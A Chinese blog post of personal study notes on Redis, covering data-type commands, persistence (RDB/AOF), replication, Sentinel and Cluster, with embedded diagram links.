<h3 id="高可用、分布式"><a href="#高可用、分布式" class="headerlink" title="高可用、分布式"></a>高可用、分布式</h3><p>Redis-Sentinel（v2.8）支持高可用</p>
<p>Redis-Cluster（v3.0）支持分布式</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><h3 id="缓存系统"><a href="#缓存系统" class="headerlink" title="缓存系统"></a>缓存系统</h3><p><img data-src="http://tuchuang.xchcloud.cn/缓存图二.png" alt="图二"></p>
<h3 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h3><p><img data-src="http://tuchuang.xchcloud.cn/计数器图三.png" alt="图三"></p>
<h3 id="消息队列系统"><a href="#消息队列系统" class="headerlink" title="消息队列系统"></a>消息队列系统</h3><p><img data-src="http://tuchuang.xchcloud.cn/消息队列图四.png" alt="图四"></p>
<h3 id="排行榜"><a href="#排行榜" class="headerlink" title="排行榜"></a>排行榜</h3><h3 id="社交网络"><a href="#社交网络" class="headerlink" title="社交网络"></a>社交网络</h3><p>粉丝数、关注数、共同关注</p>
<h3 id="实时系统"><a href="#实时系统" class="headerlink" title="实时系统"></a>实时系统</h3><p>垃圾邮件过滤</p>
<h2 id="redis-安装"><a href="#redis-安装" class="headerlink" title="redis 安装"></a>redis 安装</h2><p>安装、可执行文件说明、三种启动方法、简单的客户端连接</p>
<p>redis-server RRedis服务器<br>redis-cli redis 命令行客户端<br>redis-benchmark redis 性能测试工具<br>redis-check-aof AOF文件修复工具<br>redis-check-dump RDB文件检查工具<br>redis-sentinel Sentinel服务器（2.8以后）</p>
<p>三种启动方法：</p>
<p>最简启动</p>
<p>动态参数启动<br>redis-server –port 6380</p>
<p>配置文件启动<br>redis-server configPath</p>
<p>三种启动方式比较：<br>生成环境选择配置启动<br>单机多实例配置文件可以用端口区分开</p>
<p>redis 客户端链接<br>redis-cli -h 10.10.19.150 -p 6384<br>10.10.79.150:6384&gt; ping<br>PONG<br>10.10.79.150:6384&gt; set hello world<br>“OK”<br>10.10.79.150:6384&gt;get hello<br>“world”</p>
<p>redis 客户端返回值<br>状态回复<br>错误回复<br>整数回复<br>字符串回复<br>多行字符串回复</p>
<p>验证是否启动</p>
<p>ps -ef | grep redis<br>netstat -antpl | grep redis<br>redis-cli -h ip -p port ping</p>
<p>redis 常用配置：<br>daemonize：是否守护进程<br>port：redis 对外端口<br>logfile：redis 系统日志<br>dir：redis 工作目录<br>RDB config<br>AOF config<br>slow Log config<br>maxMemory</p>
<h2 id="通用命令"><a href="#通用命令" class="headerlink" title="通用命令"></a>通用命令</h2><h3 id="通用命令-1"><a href="#通用命令-1" class="headerlink" title="通用命令"></a>通用命令</h3><p>keys</p>
<p>dbsize</p>
<p>exists key</p>
<p>del key [key ….]</p>
<p>expire key seconds :key在secends卖弄之后过期<br>ttl key ：查看key剩余的过期时间<br>persist key ：去掉key的过期时间</p>
<p>返回值 0 -1：代表key存在，并且没有过期时间 -2：代表不存在了</p>
<p>type key ：返回 key 的类型<br>string、hash、list、set、zset、none</p>
<p>incr key：key自增1，如果key不存在，自增后get(key)=1 O(1)<br>decr key：key自减1，如果key不存在，自减后get(key)=1 O(1)<br>incrby key k：key自增k，如果key不存在，自增后get(key)=k O(1)<br>decr key k：key自减k，如果key不存在，自减后get(key)=k O(1)</p>
<p>set key value ： 不管 key 是否存在，都设置 O(1)<br>setnx key value ：key 不存在，才设置 O(1)<br>set key value xx : key存在，才设置 O(1)</p>
<p>mget key1 key2 key3 …..  O(n)<br>mset key1 value1 key2 value2 key3 value3 O(n)<br>n 次 get = n 次网络时间 + n 次命令时间；这里用 mget 的话能省去大量的时间</p>
<p>getset key newvalue : set key newvalue 并返回旧的 value O(1)<br>append key value : 将 value 追加到旧的 value  O(1)<br>strlen key 返回字符串的长度（注意中文） O(1)</p>
<p>incrbyfloat key 3.5 ： 增加 key 对应的值3.5<br>getrange key start end ： 获取字符串指定下标所有的值<br>setrange key index value : 设置指定下标所有对应的值</p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p><img data-src="http://tuchuang.xchcloud.cn/时间复杂度图五.png" alt="图五"></p>
<h3 id="数据结构和内部编码"><a href="#数据结构和内部编码" class="headerlink" title="数据结构和内部编码"></a>数据结构和内部编码</h3><p><img data-src="http://tuchuang.xchcloud.cn/数据结构和内部编码图六.png" alt="图六"></p>
<p>redisObject<br><img data-src="http://tuchuang.xchcloud.cn/redisobject%20%E5%9B%BE%E4%B8%83.png" alt="图七"></p>
<h3 id="单线程"><a href="#单线程" class="headerlink" title="单线程"></a>单线程</h3><p>一瞬间只执行一个命令</p>
<p>为什么还是快：<br>纯内存；非阻塞 IO；避免线程切换和静态消耗</p>
<p>使用单线程时要注意什么：<br>一次只能用一条命令；<br>拒绝长命令：在应用中，高可用别这么用，会卡导致超时</p>
<h3 id="字符串键值结构"><a href="#字符串键值结构" class="headerlink" title="字符串键值结构"></a>字符串键值结构</h3><p><img data-src="http://tuchuang.xchcloud.cn/字符串总结图九.png" alt="图八"></p>
<h3 id="字符串总结"><a href="#字符串总结" class="headerlink" title="字符串总结"></a>字符串总结</h3><p><img data-src="http://tuchuang.xchcloud.cn/字符串总结图九.png" alt="图九"></p>
<h3 id="redis-Api-的使用和理解"><a href="#redis-Api-的使用和理解" class="headerlink" title="redis Api 的使用和理解"></a>redis Api 的使用和理解</h3><p>哈希：</p>
<p>特点<br>重要 API</p>
<p>hash vs string</p>
<p>查缺补漏</p>
<p><img data-src="http://tuchuang.xchcloud.cn/hash%20%E9%94%AE%E5%80%BC%E7%BB%93%E6%9E%84%E5%9B%BE10.png" alt="图十"><br><img data-src="http://tuchuang.xchcloud.cn/图11.png" alt="图11"></p>
<p>hget key field : 获取 hash key 对应的 file 的 value O(1)<br>hset key field value ：设置 hash key 对应的 value O(1)<br>hdel key field ： 删除 hash key 对应 field 的 value O(1)</p>
<p>hexists key field : 判断 hash key 是否有 field  O(1)<br>hlen key ： 获取 hash key field 的数量  O(1)</p>
<p>hmget key field1 field2 … fieldN : 批量获取 hash key 的一批 field 对应的值 O(n)<br>hmset key field1 value1 field2 value2 … fieldN valueN O(n)</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>hincrby user:1:info pageview count</p>
<p>hgetall key : 返回 hash key 对应所有的 field 和 value O(n)<br>hvals key ：返回 hash key 对应所有 field 的 value O(n)<br>hkeys key ： 返回 hash key 对应所有 field O(n)</p>
<p>小心使用 hgetall ，牢记单线程，会比较慢</p>
<p>如何更新用户属性？<br>string 实现2种，hash</p>
<p><img data-src="http://tuchuang.xchcloud.cn/有序集合总结图十三.png" alt="图十二"></p>
<p>列表结构：<br>有序、可以重复、数据结构一样左右两边插入弹出</p>
<p>rpush key value1 value2 … valueN : 从列表右端插入 O(1~n)<br>lpush key value1 value2 … valueN : 从列表左端插入 O(1~n)  </p>
<p>linsert key before|after value newvalue : 在 list 指定的值前|后插入newvalue O(n)</p>
<p>lpop key : 从列表左侧弹出一个item O(1)<br>rpop key : 从列表右侧弹出一个item O(1)</p>
<p>lrem key count value : 根据 count 值，从列表中删除所有value相等的项 O(n)<br>（1）count&gt;0,从左到右，删除最多count个value相等的项<br>（2）count&lt;0,从右到左，删除最多Math.abs(count)个value相等的项<br>（3）count=0，删除所有value相等的项</p>
<p>ltrim key start end : 按照索引范围修剪列表 O(n)<br>lrange key start end (包含end) : 获取列表指定索引范围所有item O(n)<br>lindex key index : 获取列表指定索引的item O(n)<br>llen key ： 获取列表长度<br>lset lset key index newvalue : 设置列表指定索引值为 newvalue O(n)</p>
<p>blpop key timeout : lpop 阻塞版本，timeout 时阻塞超时时间，timout=0为永远不阻塞。  O(1)<br>brpop key timeout : rpop 阻塞版本，timeout 时阻塞超时时间，timout=0为永远不阻塞。  O(1)</p>
<p>TIPS<br>1、LRUSH + LPOP = Stack<br>2、LPUSH + RPOP =Queue<br>3、LPUSH + LTRIM =Capped Collection<br>4、LPUSH + BRPOP = Message Queue</p>
<p>sadd key element : 向集合 key 添加 element （如果 element 已经存在，添加失败）<br>srem key element : 将集合key中的element移除掉</p>
<p>scard user:1:follow = 4 :计算集合大小<br>sismember user:1follow it = 1 : 判断it是否在集合中<br>srandmember user:1:follow count = his :从集合中随机挑 count 个元素   不改变<br>spop user:1:follow = sports :从集合中随机弹出一个元素   改变原来的<br>smember user:1:follow = music his sports it :获取集合所有元素  无序的，小心使用</p>
<p>集合间 API </p>
<p>sdiff user:1:follow user:2:follow = music his : 差集<br>sinter user:1:follow user:2:follow = it sports : 交集<br>sunion user:1:follow user:2:follow = it music his sports news ent ： 并集<br>sdiff|sinter|suion + store destkey .. 将差集、交集、并集结果保存在destkey中</p>
<p>有序集合：<br>无重复元素、有序<br>api 都是以 z 开头<br>zadd key score element(可以是多对) ： 添加score和element  O(logN)<br>zrem key element(可以是多个) ： 删除元素  O(1)<br>zscore key element : 返回元素的分数</p>
<p>zincrby key increScore element : 增加或者减少元素分数 O(1)<br>zcard key : 返回元素总个数 O(1)</p>
<p>zrange key start end [WITHSCORES] : 返回指定索引范围内的升序元素[分值] o(log(n)+m)<br>zrangebyscore key minScore maxScore [WITHSCORES] : 返回指定分数范围内的升序元素[分值] o(log(n)+m)<br>zcount key minScore maxScore ；返回有序集合内在指定分数范围内的个数  o(log(n)+m)</p>
<p>zremrangebyrank key start end : 删除指定排名内的升序元素  o(log(n)+m)</p>
<p>zrevrank<br>zrevrange<br>zrevrangebyscore<br>zinterstore<br>zunionstore</p>
<p><img data-src="http://tuchuang.xchcloud.cn/有序集合总结图十三.png" alt="有序集合总结图十三"></p>
<h2 id="redis-客户端"><a href="#redis-客户端" class="headerlink" title="redis 客户端"></a>redis 客户端</h2><h3 id="java-客户端-：Jedis"><a href="#java-客户端-：Jedis" class="headerlink" title="java 客户端 ：Jedis"></a>java 客户端 ：Jedis</h3><p>直连：</p>
<p>连接池：</p>
<p>问题：池子里有多少个连接合适呢</p>
<p>两种方案对比：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/直连与连接池对比图十四.png" alt="图十四"></p>
<h3 id="python-客户端-：redis-py"><a href="#python-客户端-：redis-py" class="headerlink" title="python 客户端 ：redis-py"></a>python 客户端 ：redis-py</h3><h2 id="瑞士军刀-redis"><a href="#瑞士军刀-redis" class="headerlink" title="瑞士军刀 redis"></a>瑞士军刀 redis</h2><h3 id="慢查询"><a href="#慢查询" class="headerlink" title="慢查询"></a>慢查询</h3><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><p><img data-src="http://tuchuang.xchcloud.cn/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%20%E5%9B%BE%E5%8D%81%E4%BA%94.png" alt="图十五"></p>
<p>注：慢查询发生在第三阶段；客户端超时不一定慢查询，但慢查询是客户端超时的一个可能因素。</p>
<h4 id="两个配置"><a href="#两个配置" class="headerlink" title="两个配置"></a>两个配置</h4><p>slowlog-max-len</p>
<p>1、先进先出队列<br>2、固定长度<br>3、保存在内存中</p>
<p>slowlog-log-slower-than</p>
<p>1、慢查询阈值（单位：微秒）<br>2、slowlog-log-slower-than = 0，记录所有命令<br>3、slowlog-log-slower-than &lt; 0，不记录任何命令</p>
<p>配置方法：</p>
<p>1、默认值：<br>config get slowlog-max-len = 128<br>config get slowlog-log-slower-then = 10000</p>
<p>2、修改配置文件重启</p>
<p>3、动态配置</p>
<p>config set slower-max-len 1000<br>config set slowlog-log-slower-than 1000</p>
<h4 id="三个命令"><a href="#三个命令" class="headerlink" title="三个命令"></a>三个命令</h4><p>1、slowlog get [n]：获取慢查询队列  n 条<br>2、slowlog len ： 获取慢查询队列长度<br>3、slowlog reset ： 清空慢查询队列</p>
<h4 id="运维经验"><a href="#运维经验" class="headerlink" title="运维经验"></a>运维经验</h4><p>1、slowlog-max-len 不要设置太大，默认10ms，通常设置1ms<br>2、slowlog-log-slower-than不要设置过小，通常设置1000左右<br>3、理解命令生命周期<br>4、定期持续化慢查询</p>
<h3 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h3><h4 id="什么是流水线"><a href="#什么是流水线" class="headerlink" title="什么是流水线"></a>什么是流水线</h4><p>将一批命令进行打包并进行计算，然后将结果返回。类似 m*** 操作</p>
<h4 id="与原生操作对比"><a href="#与原生操作对比" class="headerlink" title="与原生操作对比"></a>与原生操作对比</h4><p>一个是原子命令，一个是非原子的命令进行拆分。</p>
<h4 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h4><h4 id="使用建议"><a href="#使用建议" class="headerlink" title="使用建议"></a>使用建议</h4><p>1、注意每次 pipeline 携带数据量<br>2、pipeline 每次只能作用在一个redis节点上<br>3、M操作与pipeline区别</p>
<h3 id="发布订阅"><a href="#发布订阅" class="headerlink" title="发布订阅"></a>发布订阅</h3><h4 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h4><ul>
<li><p>发布者</p>
</li>
<li><p>频道</p>
</li>
<li><p>订阅者</p>
</li>
</ul>
<h4 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h4><p><img data-src="http://tuchuang.xchcloud.cn/%E6%A8%A1%E5%9E%8B%20%E5%9B%BE%E5%8D%81%E5%85%AD.png" alt="图十六"></p>
<h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><ul>
<li>publish 发布命令</li>
</ul>
<p>publish channel message</p>
<ul>
<li>subscribe </li>
</ul>
<p>subscribe [channel] : 一个或者多个</p>
<ul>
<li>unsubscribe</li>
</ul>
<p>unsubscribe [channel] : 取消订阅 一个或者多个</p>
<ul>
<li>其他</li>
</ul>
<p>1、psubscribe [pattern …]  订阅模式<br>2、punsubscribe [pattern …] 退订指定模式<br>3、pubsub channels 列出至少有一个订阅者的频道<br>4、pubsub numsub [channel …] 列出给定频道的订阅者数量<br>5、pubsub numpat 列出被订阅模式的数量</p>
<h4 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h4><p><img data-src="http://tuchuang.xchcloud.cn/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%20%E5%9B%BE%E5%8D%81%E4%B8%83.png" alt="图十七"></p>
<h4 id="发布订阅总结"><a href="#发布订阅总结" class="headerlink" title="发布订阅总结"></a>发布订阅总结</h4><p>1、发布订阅模式中的角色<br>2、重要的API<br>3、消息队列和发布订阅</p>
<h3 id="Bitmap"><a href="#Bitmap" class="headerlink" title="Bitmap"></a>Bitmap</h3><h4 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h4><p><img data-src="http://tuchuang.xchcloud.cn/%E4%BD%8D%E5%9B%BE%20%E5%9B%BE%E5%8D%81%E5%85%AB.png" alt="图十八"></p>
<h4 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h4><p>setbit key offset value  :给位图指定索引设置值</p>
<p>没看明白</p>
<p>getbit key offset : 获取位图指定索引的值</p>
<p>bitcount key [start end] : 获取位图指定范围（start到end，单位为字节，如果不指定就是获取全部）位置为1的个数。</p>
<p>bitop op destkey key [key …]<br>做多个 Bitmap 的and（交集）、or（并集）、not（非）、xor（异或）操作并将结果保存在destkey中。</p>
<p>bitpos key targetBit [start][end]<br>计算位图指定范围（start到end，单位为字节，如果不指定就是获取全部）第一个偏移量对应的值等于targetBit的位置</p>
<h4 id="独立用户统计"><a href="#独立用户统计" class="headerlink" title="独立用户统计"></a>独立用户统计</h4><p><img data-src="http://tuchuang.xchcloud.cn/独立用户图十九.png" alt="图十九"></p>
<p>没看懂</p>
<h4 id="使用经验"><a href="#使用经验" class="headerlink" title="使用经验"></a>使用经验</h4><p>1、type = string 最大512M<br>2、注意setbit时的偏移量，可能有较大耗时<br>3、位图不是绝对好</p>
<h3 id="HyperlogLog"><a href="#HyperlogLog" class="headerlink" title="HyperlogLog"></a>HyperlogLog</h3><h4 id="新的数据结构？"><a href="#新的数据结构？" class="headerlink" title="新的数据结构？"></a>新的数据结构？</h4><p>算法：极小的空间来完成独立数量统计</p>
<h4 id="内存消耗"><a href="#内存消耗" class="headerlink" title="内存消耗"></a>内存消耗</h4><p><img data-src="http://tuchuang.xchcloud.cn/内存消耗图二十.png" alt="图二十"></p>
<h4 id="三个命令-1"><a href="#三个命令-1" class="headerlink" title="三个命令"></a>三个命令</h4><p>1、pfadd key element [element …] : 向HyperlogLog添加元素<br>2、pfcount key [key …] : 计算 HyperlogLog 的独立总数<br>3、prmerge destkey sourcekey [sourcekey …] : 合并多个HyperlogLog</p>
<h4 id="使用经验-1"><a href="#使用经验-1" class="headerlink" title="使用经验"></a>使用经验</h4><p>1、是否能容忍错误？（错误率 ： 0.81%）</p>
<p>2、是否需要单条数据</p>
<h3 id="GEO"><a href="#GEO" class="headerlink" title="GEO"></a>GEO</h3><h4 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h4><p>地理信息定位: 存储经纬度、计算两地距离、范围计算等</p>
<h4 id="相关命令-1"><a href="#相关命令-1" class="headerlink" title="相关命令"></a>相关命令</h4><p>geo key longitude latitude member [longitude latitude member …] 增加地理位置信息</p>
<p>geopos key member [member …] : 获取地理位置信息</p>
<p>geodist key member1 member2 [unit] : 获取两个地理位置的距离 m米、km、mi英里、ft尺</p>
<p><img data-src="http://tuchuang.xchcloud.cn/georadius图二十.png" alt="georadius图二十"></p>
<h4 id="相关说明"><a href="#相关说明" class="headerlink" title="相关说明"></a>相关说明</h4><p>1、since 3.2<br>2、type geoKey = zset</p>
<h2 id="持久化的取舍和选择"><a href="#持久化的取舍和选择" class="headerlink" title="持久化的取舍和选择"></a>持久化的取舍和选择</h2><h3 id="持续化作用"><a href="#持续化作用" class="headerlink" title="持续化作用"></a>持续化作用</h3><h4 id="什么是持久化"><a href="#什么是持久化" class="headerlink" title="什么是持久化"></a>什么是持久化</h4><p>redis 数据保存在内存中，同时将数据的更新异步的保存到磁盘上</p>
<h4 id="持久化的实现方式"><a href="#持久化的实现方式" class="headerlink" title="持久化的实现方式"></a>持久化的实现方式</h4><p>快照：mysql dump  ； redis rdb</p>
<p>写日志 ： mysql binlog ； hbase hlog ；redis aof</p>
<h3 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h3><h4 id="什么是-RDB"><a href="#什么是-RDB" class="headerlink" title="什么是 RDB"></a>什么是 RDB</h4><p>RDB 文件 是一个二进制文件，存储在硬盘中，内存写入磁盘，重启从磁盘载入恢复，以及主从方式的媒介。</p>
<h4 id="触发机制-主要三种方式"><a href="#触发机制-主要三种方式" class="headerlink" title="触发机制-主要三种方式"></a>触发机制-主要三种方式</h4><p>同步、异步、自动。</p>
<p>save 命令</p>
<p>bgsave 命令 ： 子进程用来生成RDB文件，不会出现阻塞</p>
<p>自动生成 ： 满足一定条件，就去写一个RDB文件</p>
<p>配置：</p>
<p>dbfilename dump-${port}.rdb<br>dir /bigdiskpath<br>stop-write-on-bgsave-error yes<br>rdbcompression yes<br>rdbchecksum yes</p>
<h4 id="触发机制-不容忽视方式"><a href="#触发机制-不容忽视方式" class="headerlink" title="触发机制-不容忽视方式"></a>触发机制-不容忽视方式</h4><p>1、全量复制</p>
<p>2、debug reload  不清内存的重启</p>
<p>3、shutdown</p>
<h4 id="RDB-总结"><a href="#RDB-总结" class="headerlink" title="RDB 总结"></a>RDB 总结</h4><p>1、RDB 是 Redis 内存到硬盘的快照，用于持久化<br>2、sava通常会阻塞Redis<br>3、bgsave 不会阻塞Redis，但是会fork新进程<br>4、save 自动配置满足人亦就会被执行<br>5、有些触发机制不容忽视</p>
<h4 id="redis-配置文件说明"><a href="#redis-配置文件说明" class="headerlink" title="redis 配置文件说明"></a>redis 配置文件说明</h4><h3 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h3><h4 id="RDB-现存的问题"><a href="#RDB-现存的问题" class="headerlink" title="RDB 现存的问题"></a>RDB 现存的问题</h4><p>耗时、耗性能：O(n)数据，耗时；fork 消耗内存，copy-on-write 策略；Disk I/O</p>
<h4 id="什么是-AOF"><a href="#什么是-AOF" class="headerlink" title="什么是 AOF"></a>什么是 AOF</h4><p>AOF 文件 就像是日志，宕机能够恢复。</p>
<h4 id="AOF-三种策略"><a href="#AOF-三种策略" class="headerlink" title="AOF 三种策略"></a>AOF 三种策略</h4><p>always ：写命令刷新到缓冲区，然后每天命令都会写道AOF文件中<br>everysec ： 每秒进行刷新，每秒写道缓冲区再到AOF文件，可能存在宕机丢失1s的命令；高写入量可保护磁盘。<br>no ： 根据操作系统来，不可控，不用管</p>
<h4 id="AOF-重写"><a href="#AOF-重写" class="headerlink" title="AOF 重写"></a>AOF 重写</h4><p>作用：</p>
<p>减少磁盘占用量；<br>加速恢复速度；</p>
<p>两种方式：</p>
<p>bgrewriteaof 命令：</p>
<p>AOF 重写配置：</p>
<p>auto-aof-rewrite-min-size ： AOF 文件重写需要的尺寸<br>auto-aof-rewrite-percentage : AOF 文件增长率</p>
<p>aof_current_size : AOF 当前尺寸（单位：字节）<br>aof_base_size : AOF 上次启动和重写的尺寸（单位：字节）</p>
<p><img data-src="http://tuchuang.xchcloud.cn/AOF%E9%87%8D%E5%86%99%E6%B5%81%E7%A8%8B%20%E5%9B%BE%E5%8D%81%E5%85%AB.png" alt="AOF 重写流程 图 21"></p>
<p>配置说明：</p>
<h3 id="RDB-和-AOF-的抉择"><a href="#RDB-和-AOF-的抉择" class="headerlink" title="RDB 和 AOF 的抉择"></a>RDB 和 AOF 的抉择</h3><p><img data-src="http://tuchuang.xchcloud.cn/%E5%9B%BE%2022.png" alt="图 22"></p>
<h2 id="开发运维常见问题"><a href="#开发运维常见问题" class="headerlink" title="开发运维常见问题"></a>开发运维常见问题</h2><h3 id="fork-操作"><a href="#fork-操作" class="headerlink" title="fork 操作"></a>fork 操作</h3><p>同步操作</p>
<p>与内存量息息相关：内存越大，耗时越长（与机器类型有关）</p>
<p>info:latest_fork_usec : 查持久化的时间</p>
<p>改善 fork ：</p>
<p>1、优先使用物理机或者高效支持fork操作的虚拟化技术<br>2、控制redis实例最大可用内存：maxmemory<br>3、合理配置Linux内存分配策略：vm.overcommit_memery=1<br>4、降低fork频率：例如放宽AOF重写自动触发时机，不必要的全量复制</p>
<h3 id="进程外开销"><a href="#进程外开销" class="headerlink" title="进程外开销"></a>进程外开销</h3><p>1、CPU</p>
<ul>
<li>开销：RDB和AOF文件生成，属于CPU密集型</li>
<li>优化：不做CPU绑定，不和CPU密集型部署</li>
</ul>
<p>2、内存</p>
<ul>
<li>开销：fork内存开销，copy-on-write</li>
<li>优化： echo never &gt; /sys/kernel/mem/transparent_hugepage/enabled</li>
</ul>
<p>3、硬盘</p>
<ul>
<li>开销：AOF和RDB文件写入，可以结合iostst,iotop分析</li>
</ul>
<p>硬盘优化：<br>1、不要和高硬盘负载服务部署一起：存储服务、消息队列服务<br>2、no-appendfsync-on-rewrite = yes<br>3、根据写入量决定磁盘类型：例如ssd</p>
<h3 id="AOF-追加阻塞"><a href="#AOF-追加阻塞" class="headerlink" title="AOF 追加阻塞"></a>AOF 追加阻塞</h3><p>AOF 阻塞定位：</p>
<h2 id="Redis-复制的原理与-优化"><a href="#Redis-复制的原理与-优化" class="headerlink" title="Redis 复制的原理与 优化"></a>Redis 复制的原理与 优化</h2><h3 id="什么是主从复制"><a href="#什么是主从复制" class="headerlink" title="什么是主从复制"></a>什么是主从复制</h3><p>单机有什么问题：机器故障~容量瓶颈，QPS瓶颈</p>
<p>主从复制作用：数据副本，拓展性能。</p>
<p>一个master可以有多个slave<br>一个slave只能有一个master</p>
<h3 id="复制的配置"><a href="#复制的配置" class="headerlink" title="复制的配置"></a>复制的配置</h3><p>命令实现：slaveof ip port<br>取消主从命令：slaveof no one</p>
<p>可以子啊配置中修改添加</p>
<p>slaveof ip port<br>slave-read-only yes : 只读操作</p>
<p>命令方式：无需重启，不便于管理<br>配置方式：统一配置，需要重启</p>
<h3 id="全量复制和部分复制"><a href="#全量复制和部分复制" class="headerlink" title="全量复制和部分复制"></a>全量复制和部分复制</h3><p><img data-src="http://tuchuang.xchcloud.cn/%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%20%E5%9B%BE%2023.png" alt="全量复制 图 23"></p>
<p>全量复制开销：<br>1、bgsave时间<br>2、RDB文件网络传输时间<br>3、从节点清空数据时间<br>4、从节点加载RDB的时间<br>5、可能的AOF重写时间</p>
<p><img data-src="http://tuchuang.xchcloud.cn/%E9%83%A8%E5%88%86%E5%A4%8D%E5%88%B6%20%E5%9B%BE24.png" alt="部分复制 图 24"></p>
<h3 id="故障处理"><a href="#故障处理" class="headerlink" title="故障处理"></a>故障处理</h3><p>slave 故障</p>
<p>master 故障</p>
<h3 id="开发运维常见问题-1"><a href="#开发运维常见问题-1" class="headerlink" title="开发运维常见问题"></a>开发运维常见问题</h3><p>1、读写分离</p>
<p>把都流量分给 从节点</p>
<p>问题：复制数据的延迟；读到过期的数据，从节点故障</p>
<p>2、主从配置不一致</p>
<p>问题：例如 maxmemory 不一致：丢失数据；例如数据结构优化参数（例如hash-max-ziplist-entries）：内存不一致</p>
<p>3、规避全量复制</p>
<p>问题：第一次全量复制，第一次不可避免，小主节点、低峰；节点运行id不匹配，主节点重启，运行id会变化，导致来一次全量复制，故障转移，例如哨兵或者集群；复制积压缓冲区不足：网络中断，部分复制无法满足，增大复制缓冲区配置rel_backlog_size，网络”增强”。</p>
<p>4、规避复制风暴</p>
<p>问题：单节点复制风暴，主节点重启，多从节点复制：解决：更换复制拓扑结构，如树形结构等；单节点复制风暴：机器宕机后，大量全量复制：解决：主节点分散多机器，或者一个高可用的架构。</p>
<h2 id="Redis-Sentinel"><a href="#Redis-Sentinel" class="headerlink" title="Redis Sentinel"></a>Redis Sentinel</h2><h3 id="主从复制高可用"><a href="#主从复制高可用" class="headerlink" title="主从复制高可用"></a>主从复制高可用</h3><p>备份、分流；出现问题，故障转移~</p>
<p>手动故障转移：</p>
<p>写能力和存储能力的限制：</p>
<h3 id="架构说明"><a href="#架构说明" class="headerlink" title="架构说明"></a>架构说明</h3><p>Redis Sentinel 架构</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图11.png" alt="图23"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/图24.png" alt="故障转移 图24"></p>
<h3 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h3><p>1、配置开启主从节点<br>2、配置开启sentinel监控主节点。（sentinel是特殊的redis）<br>3、实际应该多机器<br>4、详细配置节点</p>
<p>主从节点、sentinel的配置说明</p>
<h3 id="客户端链接"><a href="#客户端链接" class="headerlink" title="客户端链接"></a>客户端链接</h3><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>三个定时任务：<br>1、每10s每个sentinel对master和slave执行info：发现slave节点，确认主从节点。<br>2、每2s每个sentinel通过master节点的channel交换信息（pub/sub）：通过<strong>sentinel</strong>:hello 频道交互，交互对节点的“看法”和自身信息。<br>3、每1s每个sentinel对其他sentinel和redis执行ping。心跳检测</p>
<p>主观下线和客观下线</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图25.png" alt="图25"></p>
<p>领导者选举</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图25.png" alt="图26"></p>
<p>故障转移（sentinel 领导者节点完成）<br><img data-src="http://tuchuang.xchcloud.cn/图27.png" alt="图27"></p>
<p>选择合适的slave节点</p>
<p><img data-src="http://tuchuang.xchcloud.cn/图28.png" alt="图28"></p>
<h3 id="常见开发运维问题"><a href="#常见开发运维问题" class="headerlink" title="常见开发运维问题"></a>常见开发运维问题</h3><p>节点运维：</p>
<p>节点下线：<br>机器下线:过保问题，机器性能问题，节点自身问题</p>
<p>sentinel failover <mastername></mastername></p>
<p>从节点：临时下线还是永久下线，读写分离等情况考虑。</p>
<p>节点上线：<br>主节点：sentinel failover 进行替换<br>从节点：slaveof即可，sentinel节点可以感知<br>sentinel节点：参考其他sentinel节点启动即可</p>
<p>高可用读写分离</p>
<p>从节点作用：<br>副本：高可用基础<br>拓展：读能力</p>
<p>三个“消息”</p>
<ul>
<li>switch-master: 切换主节点（从节点晋升主节点）</li>
<li>convert-to-slave : 切换从节点（原主节点降为从节点）</li>
<li>sdown ： 主管下线</li>
</ul>
<h2 id="Redis-Cluster"><a href="#Redis-Cluster" class="headerlink" title="Redis Cluster"></a>Redis Cluster</h2><h3 id="呼唤集群"><a href="#呼唤集群" class="headerlink" title="呼唤集群"></a>呼唤集群</h3><p>为什么呼唤：1.并发量；2。数据量</p>
<p>配置更强悍的机器</p>
<p>分布式：简单的认为加机器。</p>
<p>集群:规模化需求，并发量：OPS  数据量：“大数据”</p>
<h3 id="数据分布"><a href="#数据分布" class="headerlink" title="数据分布"></a>数据分布</h3><p>顺序分区：</p>
<p>哈希分区：（例如节点取模、一次性哈希分区、虚拟槽分区）</p>
<p>节点取余：hash(key)%nodes    PS：容量变化，会造成数据进行偏移<br>客户端分片：哈希+取余<br>节点伸缩：数据节点关系变化，导致数据迁移<br>迁移数量和添加节点数量有关：建议翻倍扩容</p>
<p>一致性hash：   PS：扩容的话影响很低<br>客户端分片：哈希+顺时针（优化取余）<br>节点伸缩：只影响临近节点，但是还是有数据迁移<br>翻倍伸缩：保证最小迁移数据和负载均衡</p>
<p>虚拟槽分区：<br>预设虚拟槽：每个槽映射一个数据子集，一版比节点数大<br>良好的哈希函数：例如CRC16<br>服务端管理节点、槽数据：例如 Redis Cluster</p>
<p>对比：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/29.png" alt="图29"></p>
